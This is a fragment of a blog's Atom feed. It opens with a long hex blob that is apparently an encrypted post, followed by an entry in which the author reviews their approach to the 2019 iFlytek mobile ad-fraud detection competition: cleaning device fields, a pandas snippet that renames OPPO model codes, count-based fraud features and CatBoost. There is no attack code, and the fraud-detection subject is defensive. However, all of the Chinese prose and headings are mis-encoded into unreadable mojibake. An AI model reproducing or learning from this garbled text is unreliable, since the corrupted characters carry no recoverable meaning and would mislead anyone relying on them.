aa83992f89f9427f4b0aa1f81016616661fb770300bcb488d503aee5596d89673aaf99f85748badffdd180e61b677d27183003bf5b234eca663d01b1ae7a56dab76f1381c8b42e661fed22e60fdc15f8032df3920f569b35b7f5ec153f73d814defc29a915168f580d5a8820c0249824df23f8dfc6410a7fc44fbc9dc72c1807f76cd93a3e51c3fd360deb4bdb94279b7af97ad20e16032df06b8b9836ef009c9ee911071db7fb75a6c8a93736e374c3deadbb57df37b79cba7113dba781511ad458ec615bcafd0c614d9c86d896b439aebb5bc3b22ccbdf728803b1b03ef5d338e4f4d171452230e0be5df0356eb6196a5449c34f476f4755ea46b786369932b16b0204b59e9edd1c9ac75d2192e65cf534860f3a34976323bfe90da24673acf4b0074f798a29a2c25a0deeb8436483da75fcf15220baec9b402dde4acd40c79b8abb0c6e461828cc01fcf8a295a0d5c7c844c48ff69a16cb9c60b068318d787434868c4e4e51a251978de3d17c7128115ffbf0506bb185ec0b8a2e21c74f39b396f1b0ae84cdddd164e9b99a03ad85cbfdc64121929a4e8cbec8dab86e17e4f919798db0a2cea55187ffc3455872d2d326776d56139e18f7757a85c05f8f744547aee6caf55952c41cc43f3a9ce5c9bb326c58299451bc1242644825856efc65b162a4518f4171fed2c5f94b20098ba37902ba7c0b835c1cf46b3628ebaba9dbb768ed80db8db6db60b3adb91a9260db9cd6e661aa57a38185a23b03046586dbecd0e3a3150c309973622a3dd00c67e4cab7b4db5103f0d2c6c9533b2883b7402203b501522b4b874bd8e68554fa119a3ef4a4447de5f757ffaf02d842303b310a5ec9024fe8246aa59ecb2839688f377bb61b44037659e6e0589543460278a539a8cd117451e272b14d12ac733c7d0f54384ae1684454e894d94421c2507cd7c2b795351164169e50352ae6acc176c4b8b65980fd4d01fa861dae44cf98d6ce384199b7b75987638449eb282f5952e78adb74b94f2d74d0db91dee8b6418cafb3e1f9e3a02259922fce3a9032517b483b2903cd203114d65f7680929919a879ba7f836320186cbaef7120e005fd5c3cee64739522c349f08f7c0e3e4d921fd420d32834e46637e40397bafc2ac33f05ac92c49af1fedd365492873a00210e1279a0e01872190d8a6d991d35c1342cb5d38bc6abf9f1770d95385c0537120ce4772498a0e169a2c314f76666c10b0d76d3b202d91207d746496d96fc4ddeb9a513d377857ca13eac11b342cd163b481b0eabd2c60460ddafb078cef163810f37a71eaf9e84ec5a550b67042aa2d67a2d771945e8335fd7bee34e569d6f8eb245bb230f2e5ad59eb911c819c2a87290850edfdd9a991477662e16a165f38cdc5e507011fb9b5944ed8d549d259ec607f316f3d0cecfab680e14b74cef8b544e7eaf579e59035254209e78fa46702e4b0f64c582da2d0cb6c48296b62e079423995955976bef658d27cc4b5b1cb5d6d7b1efc2a979d8a5c8cb39fa156386e4f7552c5bb57e127aa74b2b73e7131da85a158943383e27b70f08dbe3e78de229540789aad9a2f6d038120c1df2e26c174d94ed7b445a1d31c4e805233416e435c87fa2e848e1f75029d6b55d94b39823bcc972fa1baf46fd5a9603dd573532b3bfab695c3b52c241b7fecfef2db0f241783ba0b244e3ae688c4e12081792a3bb3fba48bc6cfd9abb729e3c875deaf9cf37469c1d36ce9ad0d708b10d50e3aaf7109ed0649279ab80eda59d3ac98152a7f4e0733ac01766f8a62bed1f41a3c331082ac821e5ef26bfba5a95537f234548881584ab62ef20afb5bb2457993b465e0984ce833d843d5944dd4187f41b7f77c95b388c7f6ab16cad88f525181d924a5018c672131669ef2fce496788afb83df31a6cb0d70a74a150d488f86aff1cd0094987e8006cb8dd96d38d9d2689d68ab04ca32eaaad1d05d9b3ac2ff653e766bcfadf0bd4bdcb6fdf94c88996166549ed5d8c582e5415f8ccc028afd9a8b1b85c288a50106268376a90d93a44abd8e659428cc48606f746cc07bac0772adffa81353e70ba8acf5ea4aa4cf347a9095732ca66866f23636a47a3e57ed5f99586a8a1a71c780ee4639d42635f415a5b7920482cdee7105367bf5574555256c90524b11179fb9f3b86872db69831effd8ce9bd13665925259d35d9b16df2fe10ba8dfd26ff22c80af525bae7d4967cc5fc628711cba080327c38db7363d747f2a88347e6b901e784ba0e687aeeb0c7e554432be364d92fd2baeadd05e5dd377b5d566d96b1fb2f8777dae590a29cbb1bf53f0cac093c4459b41c395626945719136870e879ad0d14a9d9a09ca3a286e981cb9e1a2e963f75e1efd535cc23e66689c47359a651d150f2cfe0428f675cd4abd05101514d593f8554175ef5e6c2c24fe5ea2bd7cbaa17e38006181162adeeda435592daeee9e78c10718e274debeed9c5a9ceda774fe16d0ba4becbb560016242c630511a6ca31f9746e7e73811c319093e2c08bdc41cc1185fc18a2c62ceadb99758ddee5b294dde0830db08ba7fe649a84d94d23e4169299f793b795f98863681aa9d1ab67664e6428cd8dd71ec2d50a16555bfd74cfbad82033031a062b949eb41c4bdcd45ff6b132474fa23a0d7f971953c4e40535d4f1983e79def1ab6bda2ebf432f39c90b204412b28cc06ddf2708852269f3728d2a2451c2fc6d3c152d</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
        <author>
            <name><![CDATA[LogicJake‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2020/02/06/%E7%A7%BB%E5%8A%A8%E5%B9%BF%E5%91%8A%E5%8F%8D%E6%AC%BA%E8%AF%88%E7%AE%97%E6%B3%95%E6%8C%91%E6%88%98%E8%B5%9B%E7%AE%97%E6%B3%95-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[2019ÁßëÂ§ßËÆØÈ£ûÁßªÂä®ÂπøÂëäÂèçÊ¨∫ËØàÁÆóÊ≥ïÊåëÊàòËµõÁÆóÊ≥ï-ËµõÂêéÊÄªÁªì]]></title>
        <updated>2020-04-21T13:42:03+08:00</updated>
        <link href="https://www.logicjake.xyz/2020/02/06/%E7%A7%BB%E5%8A%A8%E5%B9%BF%E5%91%8A%E5%8F%8D%E6%AC%BA%E8%AF%88%E7%AE%97%E6%B3%95%E6%8C%91%E6%88%98%E8%B5%9B%E7%AE%97%E6%B3%95-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2020/02/06/%E7%A7%BB%E5%8A%A8%E5%B9%BF%E5%91%8A%E5%8F%8D%E6%AC%BA%E8%AF%88%E7%AE%97%E6%B3%95%E6%8C%91%E6%88%98%E8%B5%9B%E7%AE%97%E6%B3%95-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>ÊúÄÁªàÊàêÁª©ÔºöÂ§çËµõÁ¨¨‰∫åÔºåÂÜ≥Ëµõ‰∫öÂÜõ„ÄÇ<br>ÊØîËµõÂú∞ÂùÄÔºö<a href="http://challenge.xfyun.cn/2019/gamedetail?type=detail/mobileAD" target="_blank" rel="noopener">http://challenge.xfyun.cn/2019/gamedetail?type=detail/mobileAD</a></p><h1 id="ËµõÈ¢òËÉåÊôØ"><a href="#ËµõÈ¢òËÉåÊôØ" class="headerlink" title="ËµõÈ¢òËÉåÊôØ"></a>ËµõÈ¢òËÉåÊôØ</h1><p>ËÆØÈ£ûAIËê•ÈîÄ‰∫ëÂü∫‰∫éÊ∑±ËÄïÂ§öÂπ¥ÁöÑ‰∫∫Â∑•Êô∫ËÉΩÂíåÂ§ßÊï∞ÊçÆÊäÄÊúØÔºåËµã‰∫àËê•ÈîÄÊô∫ÊÖßÂàõÊñ∞ÁöÑÂ§ßËÑëÔºå‰ª•ÂÅ•ÂÖ®ÁöÑ‰∫ßÂìÅÁü©ÈòµÂíåÂÖ®Êñπ‰ΩçÁöÑÊúçÂä°ÔºåÂ∏ÆÂä©ÂπøÂëä‰∏ªÁî®AI+Â§ßÊï∞ÊçÆÂÆûÁé∞Ëê•ÈîÄÊïàËÉΩÁöÑÂÖ®Èù¢ÊèêÂçáÔºåÊâìÈÄ†Êï∞Â≠óËê•ÈîÄÊñ∞ÁîüÊÄÅ„ÄÇ</p><p>ÂπøÂëäÊ¨∫ËØàÊòØÊï∞Â≠óËê•ÈîÄÈù¢‰∏¥ÁöÑ‰∏Ä‰∏™ÈáçÂ§ßÊåëÊàòÔºåÈöèÁùÄÂü∫Á°ÄÊäÄÊúØÁöÑÊàêÁÜüÂåñÔºàÁØ°ÊîπËÆæÂ§á‰ø°ÊÅØ„ÄÅIPv4ÊúçÂä°Âåñ„ÄÅÈªëÂç°„ÄÅÊé•Á†ÅÂπ≥Âè∞Á≠âÔºâÔºåÂπøÂëäÊ¨∫ËØàÂëàÁé∞Âá∫ËßÑÊ®°Âåñ„ÄÅÈõÜÂõ¢ÂåñÁöÑË∂ãÂäøÔºåÂÖ∂‰ΩúÂºäÊâãÊÆµ‰∏ªË¶ÅÂåÖÊã¨Êú∫Âô®‰∫∫„ÄÅÊ®°ÊãüÂô®„ÄÅÁæ§Êéß„ÄÅËÇâÈ∏°/ÂêéÈó®„ÄÅ‰ºóÂåÖÁ≠â„ÄÇÂπøÂëäÊ¨∫ËØà‰∏çÊñ≠ËöïÈ£üÁùÄËê•ÈîÄÁîüÊÄÅÔºåÂèçÊ¨∫ËØàÊàê‰∏∫Êï∞Â≠óËê•ÈîÄÈ¢ÜÂüü‰∫üÂæÖÁ™ÅÁ†¥ÁöÑÂÖ≥ÈîÆÈóÆÈ¢ò„ÄÇ</p><a id="more"></a><h1 id="Êï∞ÊçÆËØ¥Êòé"><a href="#Êï∞ÊçÆËØ¥Êòé" class="headerlink" title="Êï∞ÊçÆËØ¥Êòé"></a>Êï∞ÊçÆËØ¥Êòé</h1><p>Êú¨Ê¨°ÊØîËµõ‰∏∫ÂèÇËµõÈÄâÊâãÊèê‰æõ‰∫Ü5Á±ªÊï∞ÊçÆÔºöÂü∫Êú¨Êï∞ÊçÆ„ÄÅÂ™í‰Ωì‰ø°ÊÅØ„ÄÅÊó∂Èó¥„ÄÅIP‰ø°ÊÅØÂíåËÆæÂ§á‰ø°ÊÅØ„ÄÇÂü∫Êú¨Êï∞ÊçÆÊèê‰æõ‰∫ÜÂπøÂëäËØ∑Ê±Ç‰ºöËØùsidÔºå‰ª•Âèä‚ÄúÊòØÂê¶‰ΩúÂºä‚ÄùÁöÑÊ†áËØÜ„ÄÇÂ™í‰Ωì‰ø°ÊÅØ„ÄÅÊó∂Èó¥„ÄÅIP‰ø°ÊÅØÂíåËÆæÂ§á‰ø°ÊÅØÁ≠â4Á±ªÊï∞ÊçÆÔºåÊèê‰æõ‰∫ÜÂØπ‰ΩúÂºäÈ¢Ñ‰º∞ÂèØËÉΩÊúâÂ∏ÆÂä©ÁöÑËæÖÂä©‰ø°ÊÅØ„ÄÇ</p><p>Âá∫‰∫éÊï∞ÊçÆÂÆâÂÖ®‰øùËØÅÁöÑËÄÉËôëÔºåÊâÄÊúâÊï∞ÊçÆÂùá‰∏∫ËÑ±ÊïèÂ§ÑÁêÜÂêéÁöÑÊï∞ÊçÆ„ÄÇÊï∞ÊçÆÈõÜÊèê‰æõ‰∫ÜËã•Âπ≤Â§©ÁöÑÊ†∑Êú¨ÔºåÊúÄÂêé‰∏ÄÂ§©Êï∞ÊçÆÁî®‰∫éÈ¢ÑÊµãÔºå‰∏çÊèê‰æõ‚ÄúÊòØÂê¶‰ΩúÂºä‚ÄùÊ†áËØÜÔºåÂÖ∂‰ΩôÊó•ÊúüÁöÑÊï∞ÊçÆ‰Ωú‰∏∫ËÆ≠ÁªÉÊï∞ÊçÆ„ÄÇ</p><h1 id="Ëß£ÂÜ≥ÊñπÊ°à"><a href="#Ëß£ÂÜ≥ÊñπÊ°à" class="headerlink" title="Ëß£ÂÜ≥ÊñπÊ°à"></a>Ëß£ÂÜ≥ÊñπÊ°à</h1><h2 id="Êï∞ÊçÆÈ¢ÑÂ§ÑÁêÜ"><a href="#Êï∞ÊçÆÈ¢ÑÂ§ÑÁêÜ" class="headerlink" title="Êï∞ÊçÆÈ¢ÑÂ§ÑÁêÜ"></a>Êï∞ÊçÆÈ¢ÑÂ§ÑÁêÜ</h2><p>Ëøô‰∏ÄÈ¢òÊï∞ÊçÆÈ¢ÑÂ§ÑÁêÜÂç†‰∫ÜÂæàÂ§öÁØáÂπÖÔºå‰∏ªË¶ÅÂåÖÊã¨‰∏§ÈÉ®ÂàÜÔºöÂØπÊó†ÊÑè‰πâÂ≠óÁ¨¶Êàñ‰π±Á†ÅÁöÑÂ§ÑÁêÜÔºõÂü∫‰∫é‰∏öÂä°ÈúÄË¶ÅÁöÑÊï∞ÊçÆÂ§ÑÁêÜ„ÄÇÂú®Êàë‰ª¨ÁöÑÊñπÊ°à‰∏≠ÔºåÁùÄÈáçÂØπÊìç‰ΩúÁ≥ªÁªüÔºàosvÔºâÔºåÊâãÊú∫Âà∂ÈÄ†ÂéÇÂïÜÔºàmakeÔºâÂíåÊú∫ÂûãÔºàmodelÔºâËøõË°åÂ§ÑÁêÜ„ÄÇÊúâ‰∫õ osv ÂåÖÂê´Êó†ÊÑè‰πâÁöÑÂ≠óÊÆµÔºåÊØîÂ¶Ç‚Äú??????????????????????????ÿâ*o\x18‚ÄùÊàñ‚Äú..√æ\x06&lt;√æ\x1f&lt;√æf&lt;√æ`&lt;√æ]&gt;√æ‹æ√æ\x08?√æ2?√æz?√æ|?√æ\u07ff√æ?√æ‚ÄùÔºåÊàë‰ª¨Áõ¥Êé•Â∞ÜÂÖ∂ÂÖ®ÈÉ®ÊõøÊç¢Êàê-1„ÄÇosv ‰∏ªË¶ÅÁî±‚Äú.‚ÄùÂàÜÈöîÁöÑÊï∞Â≠óÁªÑÊàêÔºåÂ¶Ç7.1.9ÁöÑÂΩ¢ÂºèÔºå‰ΩÜÂú®ÂÆûÈôÖÊï∞ÊçÆ‰∏≠ÂåÖÂê´‰∏Ä‰∫õÁî±ÂÖ∂‰ªñÂ≠óÁ¨¶ÁîöËá≥Â≠óÊØçÂàÜÈöîÁöÑosvÔºåÂ∞ÜËøô‰∫õÂàÜÈöîÁ¨¶ÊõøÊç¢Êàê‚Äú.‚ÄùÔºå‰øùËØÅÁªü‰∏ÄÊÄß„ÄÇ</p><p>make ÊúÄ‰∏ªË¶ÅÁöÑÈóÆÈ¢òÊòØÂêå‰∏ÄÂéÇÂïÜ‰∏ãÁöÑ‰∏≠Ëã±ÊñáÂêçÁß∞ÂÖ±Â≠òÔºåÊØîÂ¶Ç‚ÄúÂçé‰∏∫‚ÄùÂíå‚Äúhuawei‚ÄùÊ≤°ÊúâÂøÖË¶ÅËÆ§‰∏∫ÂÖ∂ÊòØ‰∏§‰∏™‰∏çÂêåÁöÑÂéÇÂïÜÔºàÊªëÁ®ΩÔºâÔºåÊâÄ‰ª•Áªü‰∏ÄÂ∞Ü‰∏≠ÊñáÂêçÁß∞ËΩ¨ÊàêÂ∞èÂÜôËã±ÊñáÂêçÁß∞„ÄÇÊ≠§Â§ñÂØπ‰∫é‰∏Ä‰∫õËøá‰∫éÁ≤æÁªÜÂåñÁöÑÂàÜÁ±ªËøõË°åÁ≤óÊîæÔºåÊØîÂ¶Ç‚ÄúËç£ËÄÄ‚ÄùÂΩíÂà∞‚Äúhuawei‚ÄùÔºå‚Äúm1‚ÄùÔºå‚Äúm2‚ÄùÔºå‚Äúm3‚ÄùÂÖ®ÈÉΩÂΩíÂà∞‚Äúxiaomi‚Äù„ÄÇ</p><p>model Â§ßÈÉ®ÂàÜÊï∞ÊçÆÊ†ºÂºèÈÉΩÊòØ‚ÄúÂéÇÂïÜ ÂÖ∑‰ΩìÊú∫Âûã‚ÄùÔºå‰ΩÜÂæàÂ§öÊï∞ÊçÆÈÉΩÊòØÈááÁî®ÂéÇÂïÜËá™Â∑±Áã¨ÊúâÁöÑÁºñÂè∑ÔºåÊØîÂ¶Ç OPPO Â∞±Êúâ‚ÄúPACM00‚ÄùÔºå‚ÄúPBAM00‚Äù‚Ä¶Âõ†‰∏∫ OPPO ËøôÁ±ªÊï∞ÊçÆËæÉÂ§öÔºåÊâÄ‰ª•ÁâπÊÑèÂØπÂÖ∂ËøõË°åÊ†áÂáÜÊ†ºÂºèËΩ¨Êç¢„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PACM00'</span>,<span class="string">"OPPO R15"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PBAM00'</span>,<span class="string">"OPPO A5"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PBEM00'</span>,<span class="string">"OPPO R17"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PADM00'</span>,<span class="string">"OPPO A3"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PBBM00'</span>,<span class="string">"OPPO A7"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PAAM00'</span>,<span class="string">"OPPO R15_1"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PACT00'</span>,<span class="string">"OPPO R15_2"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PABT00'</span>,<span class="string">"OPPO A5_1"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PBCM10'</span>,<span class="string">"OPPO R15x"</span>, inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>‰ª•‰∏ä‰∏âÂàóÊï∞ÊçÆËøòÂ≠òÂú®‰∏Ä‰∏™ÂÖ±ÊúâÈóÆÈ¢òÔºöÂ≠òÂú®‰∏Ä‰∫õ url ÁºñÁ†ÅÂ≠óÁ¨¶ÔºåÂ∞ÜÂÖ∂ËΩ¨Êç¢ÊàêÂØπÂ∫îÁöÑÂ≠óÁ¨¶„ÄÇÂè¶Â§ñÂØπ‰∫é‚Äôh‚Äô, ‚Äòw‚Äô, ‚Äòppi‚ÄôËøô‰∫õÊï∞ÂÄºÂ±ûÊÄßÁöÑÁº∫Â§±ÂÄºÔºåÈááÁî®Âêå‰∏ÄËÆæÂ§áÁîü‰∫ßÂéÇÂïÜ‰∏ãËØ•Â±ûÊÄßÁöÑÂπ≥ÂùáÂÄºÂ°´ÂÖÖ„ÄÇ</p><h2 id="ÁâπÂæÅÂ∑•Á®ã"><a href="#ÁâπÂæÅÂ∑•Á®ã" class="headerlink" title="ÁâπÂæÅÂ∑•Á®ã"></a>ÁâπÂæÅÂ∑•Á®ã</h2><p>Ëøô‰∏ÄÈ¢òÊúâ‰∏™ÊòéÊòæÁöÑÁâπÁÇπÂ∞±ÊòØÁ±ªÂà´ÁâπÂæÅÁâπÂà´Â§öÔºå‰ºóÊâÄÂë®Áü• catboost ÊìÖÈïøÂ§ÑÁêÜÁ±ªÂà´ÁâπÂæÅÔºåÊâÄ‰ª•Áõ¥Êé•Â∞ÜÂéüÂßãÁâπÂæÅÂñÇÂà∞ catboostÔºåÁõ∏ÂØπ‰∫éÂÖ∂‰ªñÊ®°ÂûãÊïàÊûúÈùûÂ∏∏Â•Ω„ÄÇÂú®ÊàëÁöÑÁêÜËß£‰∏≠ÔºåÂà§Êñ≠Ê¨∫ËØàË°å‰∏∫ÔºåÂÖ∂ÂÆûÂ∞±ÊòØÈÄöËøáÂ§öÂõ†Á¥†ÁöÑÁ¥ØÂä†Êù•ÈÄêÊ≠•Á°ÆËÆ§Ê¨∫ËØàÁöÑÂèØËÉΩÊÄßÔºåÊØîÂ¶ÇËØ¥Êù•Ëá™Êüê‰∏™ÂüéÂ∏ÇÁöÑÁÇπÂáªÊ¨∫ËØàË°å‰∏∫ÂèØËÉΩÊÄß‰∏∫20%ÔºåÂÅáÂ¶ÇÂÖ∂ÂêåÊó∂ÂèàÊòØ‰ΩøÁî®ÁöÑÊüê‰∏™Ê¨∫ËØàË°å‰∏∫È¢ëÁπÅÁöÑÊú∫ÂûãÔºåÂàôÊ¨∫ËØàÂèØËÉΩÊÄßÂ∞±Âèà‰ºöÊèêÈ´ò„ÄÇÊâÄ‰ª•Âú®ËøôÈ¢ò‰∏≠ÔºåÂØπÁ±ªÂà´ÁâπÂæÅËøõË°åÂ§ßÈáèÁöÑ‰∫§ÂèâÁªÑÂêàÊòØÊúâÊïàÁöÑÔºåËøô‰πüÊòØ‰∏∫‰ªÄ‰πà catboost ÁöÑÊïàÊûúË¶ÅÂ•ΩÔºåcatboost ‰ºöËá™Âä®ËøõË°åÁ±ªÂà´ÁâπÂæÅÁöÑÁªÑÂêà„ÄÇÂú®ÊØîËµõ‰∫§ÊµÅÁæ§ÔºåÊúâ‰∫∫ÈóÆÊó¢ÁÑ∂ catboost Â∑≤ÁªèËÉΩÂ§üÂÆåÊàêÁâπÂæÅÁªÑÂêàÔºåÈÇ£‰πàÁâπÂæÅÂ∑•Á®ãËøòÊúâÂøÖË¶ÅÂÅöÂ§ßÈáèÁöÑÁªÑÂêàÁâπÂæÅÂêóÔºüÊàëËÆ§‰∏∫ÊòØÂøÖË¶ÅÁöÑÔºåËøô‰∏™ÈÅìÁêÜÂÖ∂ÂÆûÂíå‚ÄúÊ∑±Â∫¶Ê®°ÂûãÁêÜËÆ∫‰∏äËÉΩÂ§üÂÆåÊàêÁâπÂæÅÁöÑÈ´òÈò∂ÁªÑÂêàÔºå‰ΩÜÂú®ÊØîËµõ‰∏≠‰∫∫Â∑•ÁâπÂæÅÂ∑•Á®ãËøòÊòØÂ≠òÂú®ÁöÑ‚Äù‰∏ÄÊ†∑ÔºåÈÉΩÊòØ‰∏∫‰∫ÜÂú®Ê∫êÂ§¥‰∏äÈôç‰ΩéÊãüÂêàÁöÑÈöæÂ∫¶ÔºåÊèêÂçáÊÄßËÉΩÁöÑ‰∏äÈôê„ÄÇ</p><p>Êàë‰ª¨ËøòÂèØ‰ª•Ê†πÊçÆ count Âíå nunique Êù•ÊåñÊéòÊ¨∫ËØàË°å‰∏∫ÔºåÊØîÂ¶Ç imei ÊòØÊâãÊú∫‰∏≤Âè∑Ôºå‰∏ÄÈÉ®ÊâãÊú∫ÂØπÂ∫î‰∏Ä‰∏™ÂîØ‰∏ÄÁöÑ imei„ÄÇÊ¨∫ËØàÂõ¢‰ºô‰∏∫‰∫ÜË∫≤ÈÅøÂà∂Ë£ÅÂæÄÂæÄ‰ºöÂà∑Êú∫Ôºå‰ªéËÄåÊîπÂèò model ÂÄºÔºåÊØîÂ¶ÇÂ∞ÜÂéüÊú¨ÁöÑÂçé‰∏∫ÊâãÊú∫Âà∑ÊàêÂ∞èÁ±≥„ÄÇÈíàÂØπ‰ª•‰∏äË°å‰∏∫ÔºåÊàë‰ª¨ÂèØ‰ª•ÁªüËÆ° imei ÊúâÂ§öÂ∞ë‰∏™‰∏çÂêåÁöÑ model ÔºåÈÄöËøáËøô‰∏™ÁâπÂæÅÂà§Êñ≠ËøôÊòØ‰∏Ä‰∏™Â≠òÂú®Âà∑Êú∫Ë°å‰∏∫ÁöÑËÆæÂ§á„ÄÇÁ±ª‰ººÁöÑÔºåÈíàÂØπËÆæÂ§áÊåÇ‰ª£ÁêÜÂèØ‰ª•ÁªüËÆ° imei ÊúâÂ§öÂ∞ë‰∏™‰∏çÂêåÁöÑ city„ÄÇÊàë‰ª¨‰πüÂèØ‰ª•ÊûÑÈÄ†ÂÖ∂‰ªñÁâπÂæÅÊù•ÂØªÊâæÊ¨∫ËØàË°å‰∏∫ÔºåÊØîÂ¶ÇÊ¨∫ËØàÂõ¢‰ºô‰ºöÂêåÊó∂ÊéßÂà∂Â§ßÈáèÁöÑÊâãÊú∫ËøõË°åÂπøÂëäÁÇπÂáªÔºåÂõ†Ê≠§‰ºöÂ§ßÈáèÈááË¥≠Êüê‰∫õ‰ª∑ÂªâÁöÑÊú∫ÂûãÔºåÂØπÂ∫îÁöÑËøô‰∫õÊú∫Âûã‰ºöÁÇπÂáªÂ§ßÈáè‰∏î‰∏çÂêåÁöÑÂπøÂëä„ÄÇËøôÈÉΩÊòØÂèØ‰ª•ÈÄöËøá count Âíå nunique ÁâπÂæÅÂíåÊ≠£Â∏∏ÁÇπÂáªË°å‰∏∫ÂàÜÂºÄÁöÑÔºåÂõ†‰∏∫Ê≠£Â∏∏ÁöÑÁî®Êà∑‰∏ç‰ºöÂéªÁÇπÂáªÈÇ£‰πàÂ§öÂπøÂëä„ÄÇ</p><p>Èô§‰∫Ü count Âíå nunique ÁªüËÆ°ÁâπÂæÅÔºåËøòÂèØ‰ª•Ê®°‰ªøÁÇπÂáªÁéáÊûÑÈÄ†Ê¨∫ËØàÁéáÁâπÂæÅÔºåÊØîÂ¶ÇÊüê‰∏™ model ÊàñËÄÖ cityÔºåÊ¨∫ËØàÊ¨°Êï∞Âç†ÊÄªÊ¨°Êï∞ÁöÑÊØîÁéá„ÄÇÊûÑÈÄ†Ê¨∫ËØàÁéáÁâπÂæÅÁöÑÂá∫ÂèëÁÇπÊù•Ëá™ËµõÈ¢òËÉåÊôØ‰∏≠ÊâÄËØ¥ÁöÑ‚ÄúÂπøÂëäÊ¨∫ËØàÂëàÁé∞Âá∫ËßÑÊ®°Âåñ„ÄÅÈõÜÂõ¢ÂåñÁöÑË∂ãÂäø‚ÄùÔºåËßÑÊ®°ÂåñÔºåÈõÜÂõ¢ÂåñÁöÑÊòæËëóÁâπÁÇπÂ∞±ÊòØÊ¨∫ËØàË°å‰∏∫ÈõÜ‰∏≠Âú®Êüê‰∏™ÂüéÂ∏ÇÔºåÂ§ßÈáè‰ΩøÁî®Êüê‰∏™Êú∫ÂûãËøõË°åÊ¨∫ËØà„ÄÇÊ≠§Â§ñÔºåËµõÈ¢ò‰∏≠ÁöÑ ip ‰ø°ÊÅØ‰πüÂèØ‰ª•Áî®Êù•ÂèëÁé∞ËßÑÊ®°ÂåñÔºåÈõÜÂõ¢ÂåñË°å‰∏∫Ôºåip ËÉΩÁªôÂá∫ÂæàÂ§öÊúâÁî®‰ø°ÊÅØÔºåÊØîÂ¶Ç ip ËÉΩÂèçÂ∫îËøêËê•ÂïÜÔºåËÆæÂ§áÊâÄÂú®ÁΩëÊÆµÔºå‰ªéËÄåÂèçÂ∫îËøôÈÉ®ÂàÜËÆæÂ§áÊòØÂê¶Â§ÑÂú®‰∏Ä‰∏™Â§ßÈáè‰∏îÈõÜ‰∏≠ÁöÑÁéØÂ¢É‰∏ãÔºåÂ¶Ç‰∏ãÂõæÊâÄÁ§∫„ÄÇÊâÄ‰ª•ÂèØ‰ª•ÂØπ ip Êåâ‚Äô.‚ÄòËøõË°åÂàÜÊÆµÔºåÂèñÂâç‰∏Ä‰∏™ÔºåÂâç‰∏§‰∏™ÔºåÂâç‰∏â‰∏™‰Ωú‰∏∫Êñ∞ÁöÑÁΩëÊÆµÁ±ªÂà´ÁâπÂæÅÔºåÁõ∏ËæÉ‰∫é city Ëøõ‰∏ÄÊ≠•ÁªÜÂåñ‰∫ÜÈõÜÂõ¢ÂåñÔºåËßÑÊ®°ÂåñÊ¶ÇÂøµ„ÄÇ</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/%E6%89%8B%E6%9C%BA%E9%9B%86%E7%BE%A4.jpg" alt="ÊâãÊú∫ÈõÜÁæ§ÔºàÂõæÁâáÊù•Ëá™ÁΩëÁªúÔºâ" title="">                </div>                <div class="image-caption">ÊâãÊú∫ÈõÜÁæ§ÔºàÂõæÁâáÊù•Ëá™ÁΩëÁªúÔºâ</div>            </figure></div><h2 id="Ê®°Âûã"><a href="#Ê®°Âûã" class="headerlink" title="Ê®°Âûã"></a>Ê®°Âûã</h2><p>ËøôÈ¢òÊØ´Êó†ÁñëÈóÆÈááÁî® catboost ÊØîËæÉÂ•ΩÔºå‰ΩÜÂ∑®Â§ßÁöÑÊï∞ÊçÆÈáèÂä†‰∏äÂ§ßÈáèÁöÑÁ±ªÂà´ÁâπÂæÅÂØºËá¥ÂçÅÂàÜÂêÉÂÜÖÂ≠òÔºåÊ®°ÂûãËÆ≠ÁªÉÂÆåÊàêÂõûÈÄÄÂà∞ÊúÄ‰ºòËø≠‰ª£ËΩÆÊ¨°ÁöÑÊó∂ÂÄôÁªèÂ∏∏ÂÜÖÂ≠òÊ∫¢Âá∫„ÄÇÂàùËµõÁöÑÊó∂ÂÄôÈááÁî® lgb Âíå catboost ËøõË°åÊäïÁ•®ÔºåÂà∞Â§çËµõÁõ¥Êé•Â∞± catboost ‰ΩÜÊ®°Âûã‰∫Ü„ÄÇÊúÄÂêéÂ§çËµõ A Ê¶ú98.26379ÔºåB Ê¶ú98.24133ÔºåËøòÊòØÂæàÁ®≥ÂÆöÁöÑ„ÄÇ </p><h1 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" 